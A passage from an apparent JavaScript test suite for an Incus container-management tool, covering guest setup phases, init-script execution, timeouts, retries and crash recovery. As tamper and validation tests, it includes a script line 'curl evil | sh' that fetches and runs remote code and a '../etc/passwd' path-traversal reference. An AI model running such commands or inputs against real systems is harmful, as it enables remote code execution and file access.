  assert.match(readFileSync(join(dir, 'pp-init-job-1.log'), 'utf8'), /hello from init/);
  assert.equal(existsSync(join(dir, 'pp-init-job-1.sh')), false, 'the materialised script is removed');
  assert.equal(existsSync(join(dir, 'pp-init-job-1.pid')), false);
  const read = sh(initResultReadScript({ jobId: 'job-1', logDir: dir, tmpDir: dir }));
  assert.equal(parseInitResult(read.stdout).rc, 3, 'a resumed job reads the recorded exit');
  const none = sh(initResultReadScript({ jobId: 'job-2', logDir: dir, tmpDir: dir }));
  assert.deepEqual([parseInitResult(none.stdout).rc, parseInitResult(none.stdout).recorded], [null, true]);
  assert.throws(() => initScriptWrapper({ jobId: 'job 1', b64 }), /plain identifier/);
  assert.throws(() => initScriptWrapper({ jobId: 'job-1', b64: 'not base64!' }), /base64/);
  rmSync(dir, { recursive: true, force: true });
});

test('a timed-out init under sh: the client is killed, the script keeps running in its own session, the kill script stops the whole group and the read-back finds no exit code (uncertain, never re-run)', async (t) => {
  const dir = tmp();
  const body = '#!/bin/sh\necho started\nsleep 30 &\nsleep 30\n';
  const b64 = Buffer.from(body, 'utf8').toString('base64');
  const child = spawn('sh', ['-s'], { stdio: ['pipe', 'pipe', 'pipe'] });
  child.stdin.end(initScriptWrapper({ jobId: 'job-t', b64, logDir: dir, tmpDir: dir }));
  await new Promise((r) => setTimeout(r, 700));
  const pidFile = join(dir, 'pp-init-job-t.pid');
  assert.ok(existsSync(pidFile), 'the wrapper recorded the script pid');
  const pid = Number(readFileSync(pidFile, 'utf8').trim());
  child.kill('SIGKILL'); // the executor's timeout: the exec client dies
  await new Promise((r) => setTimeout(r, 200));
  assert.equal(alive(pid), true, 'the init script outlives its client (its own session)');
  const read = sh(initResultReadScript({ jobId: 'job-t', logDir: dir, tmpDir: dir }));
  const res = parseInitResult(read.stdout);
  assert.equal(res.rc, null); assert.equal(res.running, pid, 'the read-back reports it running, records nothing as done');
  const kill = sh(initKillScript({ jobId: 'job-t', logDir: dir, tmpDir: dir }), { timeoutMs: 15_000 });
  assert.equal(parseInitKill(kill.stdout), 'gone', kill.stdout + kill.stderr);
  assert.equal(alive(pid), false, 'the session group is gone');
  assert.equal(existsSync(join(dir, 'pp-init-job-t.rc')), false, 'nothing claims an exit code');
  t.after(() => { try { process.kill(-pid, 'SIGKILL'); } catch { /* gone */ } rmSync(dir, { recursive: true, force: true }); });
});
function alive(pid) { try { process.kill(pid, 0); return true; } catch { return false; } }

// ── 3. the input store ────────────────────────────────────────────────────

test('setup inputs: a 0600 file next to the database, written once by reference, read and verified by digest, consumed once, swept when nobody consumed it', () => {
  const dir = setupInputsDir('/opt/pp/data/db/proxypilot.db');
  assert.equal(dir, '/opt/pp/data/db/setup-inputs');
  const base = tmp(); const d = join(base, 'setup-inputs');
  const w = writeInitScriptInput(d, SCRIPT, { ref: 'ref-1' });
  assert.deepEqual(w, { ref: 'ref-1', sha256: sha256Of(SCRIPT), bytes: Buffer.byteLength(SCRIPT) });
  assert.equal(statSync(join(d, 'ref-1.init.sh')).mode & 0o777, 0o600); assert.equal(statSync(d).mode & 0o777, 0o700);
  assert.throws(() => writeInitScriptInput(d, 'x', { ref: 'ref-1' }), /EEXIST/, 'a reference is used once');
  assert.throws(() => writeInitScriptInput(d, '', { ref: 'ref-2' }), /empty/);
  assert.throws(() => writeInitScriptInput(d, 'x', { ref: '../etc/passwd' }), /plain identifier/);
  assert.deepEqual(readInitScriptInput(d, 'ref-1'), { content: SCRIPT, sha256: w.sha256, bytes: w.bytes });
  assert.equal(readInitScriptInput(d, 'ref-none'), null);
  assert.equal(consumeInitScriptInput(d, 'ref-1'), true); assert.equal(consumeInitScriptInput(d, 'ref-1'), false); assert.equal(readInitScriptInput(d, 'ref-1'), null);
  writeInitScriptInput(d, 'a', { ref: 'old' }); writeInitScriptInput(d, 'b', { ref: 'new' });
  const past = new Date(Date.now() - 2 * 24 * 3600 * 1000); utimesSync(join(d, 'old.init.sh'), past, past);
  assert.deepEqual(sweepSetupInputs(d), ['old']); assert.equal(readInitScriptInput(d, 'new').content, 'b');
  assert.deepEqual(sweepSetupInputs(join(base, 'absent')), []);
  rmSync(base, { recursive: true, force: true });
});

// ── 4. the dashboard's create, end to end ─────────────────────────────────

test('dashboard create: the launch job carries the plan; its executor queues the guest setup BOUND to the launched guest; every phase runs and is recorded on the one setup record; the script reaches the guest and never a row; the routes step lands on the record; create-status reads it all', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs');
  const st = { instances: [] }; const h = scriptedHost(st); const gs = { initRc: 0 }; const g = scriptedGuest(gs);
  const { asked } = opsStore(d, h, g, { inputsDir });
  t.after(() => configureContainerLockStore(null));
  const { out, setup } = await dashboardCreate(d, h, g, { inputsDir });
  assert.equal(out.ok, true, JSON.stringify(out)); assert.equal(out.submitted, true);
  const create = getJob(d, out.jobId);
  assert.equal(create.status, 'succeeded'); assert.equal(create.kind, 'instance_create');
  assert.equal(st.launches, 1);
  const cprog = parseJson(create.progress_json);
  assert.ok(cprog.setup_job_id, 'the create names the setup it queued');
  const setupJob = getJob(d, cprog.setup_job_id);
  assert.equal(setupJob.kind, 'guest_setup'); assert.equal(setupJob.status, 'succeeded', setupJob.reason); assert.equal(setupJob.outcome, 'setup_complete');
  assert.equal(setupJob.requested_by, 'thomas', 'the operator who asked for the create owns the setup too');
  const sp = parseJson(setupJob.plan_json).params;
  assert.deepEqual(sp.expect, { uuid: UUID_B, created_at: '2026-09-23T12:00:05Z' }, 'bound to the guest the launch read back, not to the request');
  assert.deepEqual(sp.phases, ['network_nat', 'await_address', 'dns', 'init_script', 'routes']);
  assert.deepEqual(sp.initScript, setup.initScript); assert.deepEqual(sp.origin, { jobId: create.id, kind: 'instance_create' });
  const ph = phasesOf(d, setupJob.id);
  assert.equal(ph.network_nat.state, 'done'); assert.equal(ph.network_nat.ipForward, true); assert.deepEqual(ph.network_nat.bridges.map((b) => b.name), ['incusbr0']); assert.equal(ph.network_nat.masquerade, 'added');
  assert.deepEqual(ph.await_address, { ...ph.await_address, state: 'done', ip: '10.10.10.7', interface: 'eth0' });
  assert.equal(ph.dns.state, 'done'); assert.equal(ph.dns.result, 'written');
  assert.equal(ph.init_script.state, 'done'); assert.equal(ph.init_script.rc, 0); assert.equal(ph.init_script.script.sha256, setup.initScript.sha256);
  assert.equal(ph.routes.state, 'pending'); assert.ok(ph.routes.job, 'the routes step is queued and named on the setup record');
  assert.deepEqual(gs.initScripts, [SCRIPT], 'the exact script reached the guest, once');
  assert.equal(readInitScriptInput(inputsDir, setup.initScript.ref), null, 'the input was consumed');
  noScriptIn(d, [create.id, setupJob.id]);
  // The fixed host commands, in order, and nothing shell-shaped.
  const m = mutations(h).map((a) => a.join(' '));
  assert.ok(m.includes('sysctl -w net.ipv4.ip_forward=1')); assert.ok(m.includes('incus network set incusbr0 ipv4.nat true'));
  assert.ok(m.includes('iptables -I DOCKER-USER -i incusbr0 -j ACCEPT') && m.includes('iptables -I DOCKER-USER -o incusbr0 -j ACCEPT'));
  assert.ok(m.some((x) => x.startsWith('iptables -t nat -A POSTROUTING')));
  assert.ok(!h.calls.some((a) => a.includes('sh') || a.includes('-c')), 'no shell on the host channel');
  assert.equal(h.calls.some((a) => a[1] === 'exec'), false, 'the guest scripts go through the contained guest executor, not incus exec on the host channel');
  const routesJob = getJob(d, ph.routes.job);
  assert.equal(routesJob.kind, 'configure_routes'); assert.equal(routesJob.status, 'queued', 'queued for the backend; nothing ran it yet');
  assert.deepEqual(parseJson(routesJob.plan_json).params.services, SERVICES); assert.equal(parseJson(routesJob.plan_json).params.ip, '10.10.10.7'); assert.equal(parseJson(routesJob.plan_json).params.serviceName, 'new');
  // The create-status answer while the routes are with the backend (the poll
  // kicks the backend's drain so the dashboard never waits for the interval), then ready.
  let view = createStatus(d, 'pp-new', { nowMs: T0 });
  assert.equal(view.phase, 'caddy'); assert.equal(view.ip, '10.10.10.7'); assert.equal(view.jobId, create.id); assert.equal(view.setupJobId, setupJob.id);
  assert.equal(getJob(d, routesJob.id).status, 'running', 'the poll kicked the drain');
  const ran = await drainBackendStepsNow();
  assert.equal(ran.ran.length, 1); assert.equal(ran.ran[0].status, 'succeeded'); assert.equal(ran.ran[0].outcome, 'routes_configured');
  assert.deepEqual(asked, [{ container: 'pp-new', name: 'new', ip: '10.10.10.7', services: SERVICES }]);
  assert.equal(phasesOf(d, setupJob.id).routes.state, 'done', 'the routes outcome landed on the setup record'); assert.deepEqual(phasesOf(d, setupJob.id).routes.created, SERVICES.map((s) => s.domain));
  assert.ok(listEvents(d, setupJob.id).some((e) => e.kind === 'recovery_result' && /configure_routes job .*: done/.test(e.message)));
  assert.deepEqual(parseJson(getJob(d, create.id).progress_json).setup.phases, { network_nat: 'done', await_address: 'done', dns: 'done', init_script: 'done', routes: 'pending' }, 'the create carries the setup summary as the setup reported it');
  view = createStatus(d, 'pp-new', { nowMs: T0 });
  assert.equal(view.phase, 'ready'); assert.equal(view.initScriptWarning, null); assert.equal(view.caddyWarning, null); assert.equal(view.routesJobId, routesJob.id);
  assert.equal(readLock(d, 'pp-new'), null); assert.equal(readLock(d, HOST_NETWORK_LOCK), null); assert.equal(readLock(d, HOST_ROUTES_LOCK), null, 'every lease released');
  // A second create of the same name while nothing is open is a launch refusal (exists); nothing here reads a map.
  const again = await runLifecycle({ kind: 'instance_create', containerName: 'pp-new', image: 'images:debian/12', via: 'ui' });
  assert.equal(again.ok, false); assert.equal(lifecycleHttpStatus(again), 409); assert.equal(st.launches, 1);
});

test('a create with no script and no services queues the three-phase setup; a launch that fails queues no setup and the input is consumed; the create-status of a failed launch says so', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs');
  const st = { instances: [] }; const h = scriptedHost(st); const g = scriptedGuest({});
  opsStore(d, h, g, { inputsDir });
  t.after(() => configureContainerLockStore(null));
  const { out } = await dashboardCreate(d, h, g, { inputsDir, script: null, services: null, name: 'pp-plain' });
  const setupJob = setupOf(d, out.jobId);
  assert.deepEqual(parseJson(setupJob.plan_json).params.phases, ['network_nat', 'await_address', 'dns']);
  assert.equal(setupJob.status, 'succeeded'); assert.equal(phasesOf(d, setupJob.id).routes, undefined);
  assert.equal(createStatus(d, 'pp-plain', { nowMs: T0 }).phase, 'ready');
  st.launchFails = true;
  const bad = await dashboardCreate(d, h, g, { inputsDir, name: 'pp-bad' });
  const create = getJob(d, bad.out.jobId);
  assert.equal(create.status, 'failed'); assert.equal(parseJson(create.progress_json).setup_job_id, undefined, 'no setup for a guest that is not there');
  assert.equal(listJobs(d, { app: 'pp-bad' }).filter((j) => j.kind === 'guest_setup').length, 0);
  const view = createStatus(d, 'pp-bad', { nowMs: T0 });
  assert.equal(view.phase, 'failed'); assert.match(view.error, /image not found/);
  assert.ok(readInitScriptInput(inputsDir, bad.setup.initScript.ref), 'the executor never reached the input; the sweep removes it after a day');
});

// ── 5. MCP's create and the start / restart fix-up ────────────────────────

test('MCP create: the launch carries the NAT + address plan (no script, no routes); the tool waits on the setup RECORD for the host-reachable address', async (t) => {
  const d = db(); const st = { instances: [], addressAfter: 3 }; const h = scriptedHost(st); const g = scriptedGuest({});
  opsStore(d, h, g);
  t.after(() => configureContainerLockStore(null));
  const launch = await runLifecycle({ kind: 'instance_create', containerName: 'pp-m', image: 'images:debian/12', profile: 'default', config: { 'limits.cpu': '2', 'limits.memory': '4096MiB', 'boot.autostart': 'true' }, setup: { phases: ['network_nat', 'await_address'], addressTimeoutMs: 15_000 }, requestedBy: 'key-1', via: 'mcp' });
  assert.equal(launch.ok, true, JSON.stringify(launch)); assert.ok(launch.setupJobId, 'the create answers with the setup job');
  const setup = await waitForSetup(d, launch.setupJobId, { timeoutMs: 5000 });
  assert.equal(setup.status, 'succeeded'); assert.equal(setup.progress.address.ip, '10.10.10.7'); assert.deepEqual(Object.keys(setup.progress.phases), ['network_nat', 'await_address']);
  assert.equal(g.calls.length, 0, 'no guest script for an MCP create'); assert.equal(setup.via, 'system'); assert.equal(setup.requested_by, 'key-1');
});

test('start / restart / reboot with fixup: the NAT + DNS setup is a follow-up of the job, bound to the guest, recorded — a start of an already-Running guest still gets it; a managed restart queues the setup and then the ladder', async (t) => {
  const d = db(); const st = { instances: [inst({ status: 'Stopped' })] }; const h = scriptedHost(st); const gs = {}; const g = scriptedGuest(gs);
  opsStore(d, h, g);
  t.after(() => configureContainerLockStore(null));
  const start = await runLifecycle({ kind: 'instance_start', containerName: 'pp-x', fixup: true, via: 'ui', requestedBy: 'thomas' });
  assert.equal(start.ok, true, JSON.stringify(start)); assert.equal(start.instanceState, 'Running'); assert.ok(start.setupJobId);
  const s1 = getJob(d, start.setupJobId);
  assert.equal(s1.status, 'succeeded'); assert.deepEqual(parseJson(s1.plan_json).params.phases, ['network_nat', 'dns']); assert.deepEqual(parseJson(s1.plan_json).params.expect, { uuid: UUID_A, created_at: '2026-09-01T10:00:00Z' });
  assert.equal(gs.dnsWrites, 1); assert.equal(parseJson(getJob(d, start.jobId).progress_json).setup.status, 'succeeded');
  const again = await runLifecycle({ kind: 'instance_start', containerName: 'pp-x', fixup: true, via: 'ui' });
  assert.equal(again.alreadyInState, true); assert.ok(again.setupJobId, 'nothing issued for the start, the fix-up still queued'); assert.equal(getJob(d, again.setupJobId).status, 'succeeded'); assert.equal(gs.dnsWrites, 2);
  const plain = await runLifecycle({ kind: 'instance_restart', containerName: 'pp-x', force: false, via: 'ui' });
  assert.equal(plain.ok, true); assert.equal(plain.setupJobId, null, 'no fixup asked, no setup');
  // Managed: the setup runs first, then the ladder (a second follow-up).
  configureContainerLockStore(null);
  const { asked } = opsStore(d, h, g);
  const managedStore = configureContainerLockStore;
  void managedStore; void asked;
  const res = await runLifecycle({ kind: 'instance_restart', containerName: 'pp-x', force: true, fixup: true, via: 'ui' });
  assert.equal(res.ok, true); assert.ok(res.setupJobId);
  const follow = listJobs(d, { app: 'pp-x' }).filter((j) => ['guest_setup', 'verify_app'].includes(j.kind) && (parseJson(j.plan_json).params.origin?.jobId === res.jobId)).sort((a, b) => a.created_at.localeCompare(b.created_at) || a.id.localeCompare(b.id));
  assert.deepEqual(follow.map((j) => j.kind), ['guest_setup'], 'pp-x is not a project: the ladder does not apply');
});

// ── 6. failures after the guest is Running: partial, truthful, guest kept ─

test('no address: the wait ends at its bound, DNS and the init script still run, the routes are skipped and say why; the job is setup_partial; the guest is Running and never deleted; create-status is ready with the warning', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })], noAddress: true }; const h = scriptedHost(st); const gs = {}; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: [...SETUP_PHASES], expect: { uuid: UUID_B }, initScript: script, services: SERVICES, serviceName: 'n', addressTimeoutMs: 30_000 }, nowMs: T0 });
  assert.ok(sub.job, sub.error);
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'setup_partial');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.await_address.state, 'failed'); assert.match(ph.await_address.detail, /no host-reachable IPv4 address within 30 s/); assert.ok(ph.await_address.polls >= 30, `polled ${ph.await_address.polls} times over a fake clock`);
  assert.equal(ph.dns.state, 'done'); assert.equal(ph.init_script.state, 'done'); assert.equal(ph.routes.state, 'skipped'); assert.match(ph.routes.detail, /no host-reachable address/);
  assert.equal(listJobs(d, { app: 'pp-n' }).filter((j) => j.kind === 'configure_routes').length, 0);
  assert.equal(st.deletes, undefined); assert.equal(st.instances[0].status, 'Running');
  assert.match(getJob(d, sub.job.id).reason, /await_address failed/);
  assert.equal(parseJson(getJob(d, sub.job.id).verification_json).state, 'not_applicable');
  assert.equal(readLock(d, 'pp-n'), null);
});

test('an init script that exits nonzero: recorded with its code and tail, the input consumed, the guest kept; the create-status warning names it; a RETRY redoes NAT and DNS and never runs the script again', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = { initRc: 100 }; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat', 'await_address', 'dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'setup_partial');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.init_script.state, 'failed'); assert.equal(ph.init_script.rc, 100); assert.match(ph.init_script.tail, /Unable to locate package/);
  assert.equal(readInitScriptInput(inputsDir, script.ref), null, 'consumed');
  assert.match(initWarning(ph.init_script), /exited with code 100/);
  noScriptIn(d, [sub.job.id]);
  assert.equal(gs.initScripts.length, 1);
  // The retry: the same plan with retryOf (what POST /api/setup/jobs/:id/retry queues).
  gs.initRc = 0;
  const retry = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: parseJson(getJob(d, sub.job.id).plan_json), configRefs: {}, retryOf: sub.job.id, via: 'ui', nowMs: T0 + 60_000 });
  c.tick(60_000);
  const out2 = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out2.ran[0].id, retry.id); assert.equal(out2.ran[0].status, 'succeeded', getJob(d, retry.id).reason);
  const ph2 = phasesOf(d, retry.id);
  assert.equal(ph2.network_nat.state, 'done'); assert.equal(ph2.dns.state, 'done');
  assert.equal(ph2.init_script.state, 'skipped'); assert.equal(ph2.init_script.notRepeated, true); assert.match(ph2.init_script.detail, /completed with exit 100 by the attempt this job retries; a retry never repeats it/);
  assert.equal(gs.initScripts.length, 1, 'the script did not run again'); assert.equal(gs.dnsWrites, 2);
});

test('an init script that times out: the exec client dies at the bound, the kill script stops the group, the phase reads timed_out with the tail; nothing is re-run', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = { initTimesOut: true }; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script, initTimeoutMs: 60_000 }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.init_script.state, 'timed_out'); assert.equal(ph.init_script.killed, 'gone'); assert.match(ph.init_script.detail, /ran longer than 60 s and was stopped/); assert.match(ph.init_script.tail, /still going/);
  assert.equal(gs.killed, 1); assert.equal(gs.initScripts.length, 1);
  assert.equal(readInitScriptInput(inputsDir, script.ref), null);
  assert.match(initWarning(ph.init_script), /timed out after 1 minutes/);
});

test('containment unavailable in the guest: the host phases run, the guest phases are refused by name (nothing run), the guest is kept; a script input the executor cannot run is refused when its digest differs from the plan', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = { containment: 'none' }; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: [...SETUP_PHASES], expect: { uuid: UUID_B }, initScript: script, services: SERVICES, serviceName: 'n' }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.network_nat.state, 'done'); assert.equal(ph.await_address.state, 'done');
  assert.equal(ph.dns.state, 'refused'); assert.match(ph.dns.detail, /containment_unavailable/); assert.equal(ph.init_script.state, 'refused'); assert.match(ph.init_script.detail, /containment_unavailable/);
  assert.equal(ph.routes.state, 'pending', 'the routes do not need the guest');
  assert.equal(gs.initScripts.length, 0); assert.ok(readInitScriptInput(inputsDir, script.ref), 'not consumed: nothing ran');
  // A tampered input.
  const d2 = db(); const gs2 = {}; const g2 = scriptedGuest(gs2); const h2 = scriptedHost({ instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] });
  writeFileSync(join(inputsDir, `${script.ref}.init.sh`), '#!/bin/sh\ncurl evil | sh\n');
  const sub2 = submitRunnerJob(d2, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, nowMs: T0 });
  await runAll(d2, exec(h2, g2), c, { inputsDir });
  const ph2 = phasesOf(d2, sub2.job.id);
  assert.equal(ph2.init_script.state, 'refused'); assert.match(ph2.init_script.detail, /not the revision this job was bound to/); assert.equal(gs2.initScripts.length, 0);
});

test('identity: a setup bound to one guest refuses a guest recreated under the same name (nothing run); a guest that is not Running is refused; an absent guest is not found', async (t) => {
  const d = db(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = {}; const g = scriptedGuest(gs);
  const s1 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat', 'dns'], expect: { uuid: UUID_A } }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c);
  assert.equal(out.ran[0].status, 'refused'); assert.match(getJob(d, s1.job.id).reason, /not the guest this setup was bound to \(uuid 99999999… differs/);
  assert.deepEqual(mutations(h), []); assert.equal(g.calls.length, 0);
  st.instances[0].status = 'Stopped';
  const s2 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns'], expect: { uuid: UUID_B } }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(getJob(d, s2.job.id).status, 'refused'); assert.match(getJob(d, s2.job.id).reason, /reads Stopped, not Running/);
  const s3 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-gone', params: { container: 'pp-gone', phases: ['dns'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(getJob(d, s3.job.id).status, 'failed'); assert.match(getJob(d, s3.job.id).reason, /does not exist/);
});

test('NAT is best effort where the host lacks a piece and says so: no Docker chain is a note, a refused sysctl or bridge NAT is a failed phase; a bridge name the host reports that is not a name is never issued', async (t) => {
  const d = db(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })], dockerChain: false, bridges: [{ name: 'incusbr0', type: 'bridge', managed: true }, { name: 'bad name', type: 'bridge', managed: true }] };
  const h = scriptedHost(st); const g = scriptedGuest({});
  const s1 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  const ph = phasesOf(d, s1.job.id);
  assert.equal(ph.network_nat.state, 'done'); assert.deepEqual(ph.network_nat.bridges[0].dockerUser, ['in:unavailable', 'out:unavailable']); assert.match(ph.network_nat.notes.join(' '), /bridge name\(s\) not accepted for a command: bad name/);
  assert.ok(!h.calls.some((a) => a.includes('bad name')));
  assert.equal(getJob(d, s1.job.id).status, 'succeeded'); assert.match(getJob(d, s1.job.id).reason, /NAT: /);
  st.sysctlFails = true;
  const s2 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(phasesOf(d, s2.job.id).network_nat.state, 'failed'); assert.match(phasesOf(d, s2.job.id).network_nat.detail, /ip_forward/); assert.equal(getJob(d, s2.job.id).status, 'failed');
});

// ── 7. interruption ───────────────────────────────────────────────────────

function deadSetup(d, { params, cp, id = 'dead-1', owner = DEAD, progress = null }) {
  createJob(d, { id, kind: 'guest_setup', app: params.container, plan: { steps: [], params }, nowMs: T0 - 100_000 });
  const c = claimNextJob(d, { owner, kinds: ['guest_setup'], nowMs: T0 - 99_000 });
  checkpoint(d, { id, owner, epoch: c.epoch, phase: cp.phase, checkpoint: cp, progress, nowMs: T0 - 98_000 });
  acquireLock(d, { app: params.container, owner, operation: 'guest_setup', jobId: id, nowMs: T0 - 98_000 });
  return getJob(d, id);
}

test('interruption BEFORE the script was issued: the dead owner\'s setup is resumed by the runner\'s reconcile, the idempotent phases run again, the script runs exactly once', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = {}; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const params = { container: 'pp-n', phases: ['network_nat', 'dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script };
  deadSetup(d, { params, cp: { phase: 'dns', setup: true, resumable: true, disruptive: false, target: { uuid: UUID_B, created_at: '2026-09-01T10:00:00Z' }, container: 'pp-n', phases: { network_nat: { state: 'done' } } } });
  const dec = reconcileDecision({ job: getJob(d, 'dead-1'), lock: readLock(d, 'pp-n'), nowMs: T0, canAct: true });
  assert.equal(dec.action, 'resume');
  const r = reconcile({ db: d, owner: RUNNER, nowMs: T0 });
  assert.deepEqual(r.requeued, ['dead-1']); assert.equal(readLock(d, 'pp-n'), null);
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].id, 'dead-1'); assert.equal(out.ran[0].status, 'succeeded', getJob(d, 'dead-1').reason);
  assert.equal(gs.initScripts.length, 1); assert.equal(phasesOf(d, 'dead-1').init_script.state, 'done'); assert.equal(getJob(d, 'dead-1').owner, RUNNER);
});

test('interruption AFTER the script was issued: the resumed job READS the exit code the guest recorded and never runs the script again; with nothing recorded it ends recovery_required / init_uncertain with the lease released and the origin annotated; the boot sweep records the same for a dead backend', async (t) => {
  const inputsDir = join(tmp(), 'setup-inputs');
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const cp = { phase: 'init_script', setup: true, resumable: true, disruptive: false, init_issued: true, target: { uuid: UUID_B, created_at: '2026-09-01T10:00:00Z' }, container: 'pp-n', phases: { network_nat: { state: 'done' }, dns: { state: 'done' } }, script: { ref: script.ref, sha256: script.sha256 } };
  const mk = (gs) => { const d = db(); const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest(gs); return { d, h, g, st }; };
  // (a) the guest recorded exit 0.
  {
    const c = clock(); const { d, h, g } = mk({ guestRc: 0 });
    const params = { container: 'pp-n', phases: ['network_nat', 'dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script };
    deadSetup(d, { params, cp });
    const dec = reconcileDecision({ job: getJob(d, 'dead-1'), lock: readLock(d, 'pp-n'), nowMs: T0, canAct: true });
    assert.equal(dec.action, 'resume'); assert.match(dec.reason, /never runs the script again/);
    reconcile({ db: d, owner: RUNNER, nowMs: T0 });
    const out = await runAll(d, exec(h, g), c, { inputsDir });
    assert.equal(out.ran[0].status, 'succeeded', getJob(d, 'dead-1').reason);
    const ph = phasesOf(d, 'dead-1');
    assert.equal(ph.init_script.state, 'done'); assert.equal(ph.init_script.resumed, true); assert.match(ph.init_script.detail, /result read from the guest/);
    assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0, 'the script was NOT run again'); assert.equal(g.calls.filter((x) => x.phase === 'init_read').length, 1);
  }
  // (b) the guest recorded exit 7.
  {
    const c = clock(); const { d, h, g } = mk({ guestRc: 7 });
    deadSetup(d, { params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, cp });
    reconcile({ db: d, owner: RUNNER, nowMs: T0 });
    await runAll(d, exec(h, g), c, { inputsDir });
    assert.equal(getJob(d, 'dead-1').status, 'failed'); assert.equal(phasesOf(d, 'dead-1').init_script.rc, 7); assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0);
  }
  // (c) nothing recorded: uncertain, the lease released, the origin annotated, a later start not refused.
  {
    const c = clock(); const { d, h, g } = mk({ guestRc: null, guestRunning: 4242 });
    createJob(d, { id: 'create-1', kind: 'instance_create', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', image: 'images:debian/12' } }, status: 'succeeded', nowMs: T0 - 200_000 });
    deadSetup(d, { params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script, origin: { jobId: 'create-1', kind: 'instance_create' } }, cp });
    reconcile({ db: d, owner: RUNNER, nowMs: T0 });
    const out = await runAll(d, exec(h, g), c, { inputsDir });
    assert.equal(out.ran[0].status, 'recovery_required'); assert.equal(out.ran[0].outcome, 'init_uncertain');
    const ph = phasesOf(d, 'dead-1');
    assert.equal(ph.init_script.state, 'uncertain'); assert.match(ph.init_script.detail, /still running in the guest as pid 4242/);
    assert.match(getJob(d, 'dead-1').reason, /pp-init-dead-1\.log/); assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0);
    assert.equal(readLock(d, 'pp-n'), null, 'no hold: the guest is running and usable');
    assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.outcome, 'init_uncertain');
    assert.ok(listEvents(d, 'create-1').some((e) => e.kind === 'recovery_result' && /init_uncertain/.test(e.message)));
